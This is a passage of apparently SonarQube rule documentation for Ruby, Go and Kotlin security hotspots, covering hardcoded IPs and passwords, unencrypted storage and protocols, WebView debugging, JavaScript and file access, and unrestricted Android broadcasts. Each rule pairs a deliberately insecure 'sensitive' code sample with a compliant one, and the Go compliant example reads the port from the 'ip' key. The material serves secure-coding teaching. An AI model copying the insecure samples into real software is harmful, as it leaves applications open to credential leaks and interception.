  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=ruby:S1313">
              ruby:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
ip = "192.168.12.42"; // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
ip = IP_ADDRESS; // Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=ruby:S2068">
              ruby:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=go:S1313">
              go:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
var (
  ip   = "192.168.12.42"
  port = 3333
)

SocketClient(ip, port)
</pre>
<h2>Compliant Solution</h2>
<pre>
config, err := ReadConfig("properties.ini")

ip := config["ip"]
port := config["ip"]

SocketClient(ip, port)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non-routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID) </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=go:S2068">
              go:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
func connect()  {
  user := "root"
  password:= "supersecret" // Sensitive

  url := "login=" + user + "&amp;passwd=" + password
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func connect()  {
  user := getEncryptedUser()
  password:= getEncryptedPass() // Compliant

  url := "login=" + user + "&amp;passwd=" + password
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/798">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/259">MITRE, CWE-259</a> - Use of Hard-coded Password </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6300">
              kotlin:S6300
            </a>
          </td>
          <td>
            <details>
              <p>Storing files locally is a common task for mobile applications. Files that are stored unencrypted can be read out and modified by an attacker with
physical access to the device. Access to sensitive data can be harmful for the user of the application, for example when the device gets stolen.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The file contains sensitive data that could cause harm when leaked. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to password-encrypt local files that contain sensitive information. The class <a
href="https://developer.android.com/reference/androidx/security/crypto/EncryptedFile">EncryptedFile</a> can be used to easily encrypt files.</p>
<h2>Sensitive Code Example</h2>
<pre>
val targetFile = File(activity.filesDir, "data.txt")
targetFile.writeText(fileContent)  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
val mainKey = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)

val encryptedFile = EncryptedFile.Builder(
    File(activity.filesDir, "data.txt"),
    activity,
    mainKey,
    EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB
).build()

encryptedFile.openFileOutput().apply {
    write(fileContent)
    flush()
    close()
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/311">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5332">
              kotlin:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<p>These clients from <a href="https://commons.apache.org/proper/commons-net/">Apache commons net</a> libraries are based on unencrypted protocols and
are not recommended:</p>
<pre>
val telnet = TelnetClient(); // Sensitive

val ftpClient = FTPClient(); // Sensitive

val smtpClient = SMTPClient(); // Sensitive
</pre>
<p>Unencrypted HTTP connections, when using <a href="https://square.github.io/okhttp/https/">okhttp</a> library for instance, should be avoided:</p>
<pre>
val spec: ConnectionSpec = ConnectionSpec.Builder(ConnectionSpec.CLEARTEXT) // Sensitive
  .build()
</pre>
<p>Android WebView can be configured to allow a secure origin to load content from any other origin, even if that origin is insecure (mixed
content):</p>
<pre>
import android.webkit.WebView

val webView: WebView = findViewById(R.id.webview)
webView.getSettings().setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW) // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use instead these clients from <a href="https://commons.apache.org/proper/commons-net/">Apache commons net</a> and <a
href="http://www.jcraft.com/jsch/">JSch/ssh</a> library:</p>
<pre>
JSch jsch = JSch();

if(implicit) {
  // implicit mode is considered deprecated but offer the same security than explicit mode
  val ftpsClient = FTPSClient(true);
}
else {
  val ftpsClient = FTPSClient();
}

if(implicit) {
  // implicit mode is considered deprecated but offer the same security than explicit mode
  val smtpsClient = SMTPSClient(true);
}
else {
  val smtpsClient = SMTPSClient();
  smtpsClient.connect("127.0.0.1", 25);
  if (smtpsClient.execTLS()) {
    // commands
  }
}
</pre>
<p>Perform HTTP encrypted connections, with <a href="https://square.github.io/okhttp/https/">okhttp</a> library for instance:</p>
<pre>
val spec: ConnectionSpec =ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)
  .build()
</pre>
<p>The most secure mode for Android WebView is <code>MIXED_CONTENT_NEVER_ALLOW</code>:</p>
<pre>
import android.webkit.WebView

val webView: WebView = findViewById(R.id.webview)
webView.getSettings().setMixedContentMode(MIXED_CONTENT_NEVER_ALLOW)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/200">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/319">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S4507">
              kotlin:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>
  <li> The application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<p><a
href="https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled(boolean)">WebView.setWebContentsDebuggingEnabled(true)</a>
for Android enables debugging support:</p>
<pre>
import android.webkit.WebView

WebView.setWebContentsDebuggingEnabled(true) // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a
href="https://developer.android.com/reference/android/webkit/WebView#setWebContentsDebuggingEnabled(boolean)">WebView.setWebContentsDebuggingEnabled(false)</a>
for Android disables debugging support:</p>
<pre>
import android.webkit.WebView

WebView.setWebContentsDebuggingEnabled(false)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>
  <li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Active Debug Code </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/215">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6363">
              kotlin:S6363
            </a>
          </td>
          <td>
            <details>
              <p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web
application, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered.</p>
<p>If malicious JavaScript code in a WebView is executed this can leak the contents of sensitive files when access to local files is enabled.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> No local files have to be accessed by the Webview. </li>
  <li> The WebView contains untrusted data that could cause harm when rendered. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to disable access to local files for WebViews unless it is necessary. In the case of a successful attack through a Cross-Site
Scripting vulnerability the attackers attack surface decreases drastically if no files can be read out.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.webkit.WebView

val webView: WebView = findViewById(R.id.webview)
webView.getSettings().setAllowContentAccess(true) // Sensitive
webView.getSettings().setAllowFileAccess(true) // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.webkit.WebView

val webView: WebView = findViewById(R.id.webview)
webView.getSettings().setAllowContentAccess(false)
webView.getSettings().setAllowFileAccess(false)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP Top 10 2021 Category A3</a> - Injection </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/79">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6362">
              kotlin:S6362
            </a>
          </td>
          <td>
            <details>
              <p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web
application, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered. In the context of a
WebView, JavaScript code can exfiltrate local files that might be sensitive or even worse, access exposed functions of the application that can result
in more severe vulnerabilities such as code injection. Thus JavaScript support should not be enabled for WebViews unless it is absolutely necessary
and the authenticity of the web resources can be guaranteed.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The WebWiew only renders static web content that does not require JavaScript code to be executed. </li>
  <li> The WebView contains untrusted data that could cause harm when rendered. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to disable JavaScript support for WebViews unless it is necessary to execute JavaScript code. Only trusted pages should be
rendered.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.webkit.WebView

val webView: WebView = findViewById(R.id.webview)
webView.getSettings().setJavaScriptEnabled(true) // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.webkit.WebView

val webView: WebView = findViewById(R.id.webview)
webView.getSettings().setJavaScriptEnabled(false)
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP Top 10 2021 Category A3</a> - Injection </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/79">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S5320">
              kotlin:S5320
            </a>
          </td>
          <td>
            <details>
              <p>In Android applications, broadcasting intents is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9489">CVE-2018-9489</a> </li>
</ul>
<p>By default, broadcasted intents are visible to every application, exposing all sensitive information they contain.</p>
<p>This rule raises an issue when an intent is broadcasted without specifying any "receiver permission".</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The intent contains sensitive information. </li>
  <li> Intent reception is not restricted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the access to broadcasted intents. See <a
href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> for more
information.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.UserHandle

public class MyIntentBroadcast {
    fun broadcast(intent: Intent,
                  context: Context,
                  user: UserHandle,
                  resultReceiver: BroadcastReceiver,
                  scheduler: Handler,
                  initialCode: Int,
                  initialData: String,
                  initialExtras: Bundle,
                  broadcastPermission: String) {
        context.sendBroadcast(intent) // Sensitive
        context.sendBroadcastAsUser(intent, user) // Sensitive

        // Broadcasting intent with "null" for receiverPermission
        context.sendBroadcast(intent, null) // Sensitive
        context.sendBroadcastAsUser(intent, user, null) // Sensitive
        context.sendOrderedBroadcast(intent, null) // Sensitive
        context.sendOrderedBroadcastAsUser(intent, user, null, resultReceiver,
            scheduler, initialCode, initialData, initialExtras) // Sensitive
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.UserHandle

public class MyIntentBroadcast {
    fun broadcast(intent: Intent,
                  context: Context,
                  user: UserHandle,
                  resultReceiver: BroadcastReceiver,
                  scheduler: Handler,
                  initialCode: Int,
                  initialData: String,
                  initialExtras: Bundle,
                  broadcastPermission: String) {

        context.sendBroadcast(intent, broadcastPermission)
        context.sendBroadcastAsUser(intent, user, broadcastPermission)
        context.sendOrderedBroadcast(intent, broadcastPermission)
        context.sendOrderedBroadcastAsUser(intent, user,broadcastPermission, resultReceiver,
            scheduler, initialCode, initialData, initialExtras)
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>
  <li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li>
  <li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/927">MITRE, CWE-927</a> - Use of Implicit Intent for Sensitive Communication </li>
  <li> <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> -
  Broadcast Overview - Security considerations and best practices </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S1313">
              kotlin:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
